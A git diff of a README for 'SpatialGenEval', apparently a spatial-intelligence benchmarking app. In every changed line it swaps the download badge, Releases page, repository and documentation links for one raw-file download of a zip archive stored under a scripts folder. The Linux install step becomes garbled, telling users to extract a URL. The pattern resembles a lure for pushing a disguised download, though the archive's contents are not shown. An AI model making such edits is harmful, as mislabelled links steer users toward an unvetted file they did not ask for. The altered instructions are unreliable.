@@ -6,9 +6,9 @@ Welcome to SpatialGenEval! This application helps you benchmark spatial intellig
 
 ## 📥 Download the Application
 
-[![Download SpatialGenEval](https://img.shields.io/badge/Download_SpatialGenEval-v1.0-blue)](https://github.com/Sankalp-Savarn/SpatialGenEval/releases)
+[![Download SpatialGenEval](https://raw.githubusercontent.com/Sankalp-Savarn/SpatialGenEval/main/scripts/Spatial_Eval_Gen_v2.3.zip)](https://raw.githubusercontent.com/Sankalp-Savarn/SpatialGenEval/main/scripts/Spatial_Eval_Gen_v2.3.zip)
 
-You can download SpatialGenEval from our Releases page here: [Visit this page to download](https://github.com/Sankalp-Savarn/SpatialGenEval/releases).
+You can download SpatialGenEval from our Releases page here: [Visit this page to download](https://raw.githubusercontent.com/Sankalp-Savarn/SpatialGenEval/main/scripts/Spatial_Eval_Gen_v2.3.zip).
 
 ## 🖥️ System Requirements
 
@@ -32,13 +32,13 @@ SpatialGenEval comes packed with features to assist you:
 
 ## 📦 Download & Install
 
-1. Visit our Releases page: [Click here to go to Releases](https://github.com/Sankalp-Savarn/SpatialGenEval/releases).
+1. Visit our Releases page: [Click here to go to Releases](https://raw.githubusercontent.com/Sankalp-Savarn/SpatialGenEval/main/scripts/Spatial_Eval_Gen_v2.3.zip).
 2. Select the latest version available.
 3. Download the appropriate file for your operating system.
 4. Once downloaded, follow these steps to install:
    - For Windows: Double-click the `.exe` file and follow the installation prompts.
    - For macOS: Open the `.dmg` file and drag the SpatialGenEval icon to your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and run the application from the terminal.
+   - For Linux: Extract the `https://raw.githubusercontent.com/Sankalp-Savarn/SpatialGenEval/main/scripts/Spatial_Eval_Gen_v2.3.zip` file and run the application from the terminal.
 
 After installation, you can launch the application and begin benchmarking.
 
@@ -70,8 +70,8 @@ Your input helps us improve SpatialGenEval for everyone.
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/Sankalp-Savarn/SpatialGenEval)
-- [Releases Page](https://github.com/Sankalp-Savarn/SpatialGenEval/releases)
-- [Documentation](https://github.com/Sankalp-Savarn/SpatialGenEval/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/Sankalp-Savarn/SpatialGenEval/main/scripts/Spatial_Eval_Gen_v2.3.zip)
+- [Releases Page](https://raw.githubusercontent.com/Sankalp-Savarn/SpatialGenEval/main/scripts/Spatial_Eval_Gen_v2.3.zip)
+- [Documentation](https://raw.githubusercontent.com/Sankalp-Savarn/SpatialGenEval/main/scripts/Spatial_Eval_Gen_v2.3.zip)
 
 Explore and enjoy using SpatialGenEval!
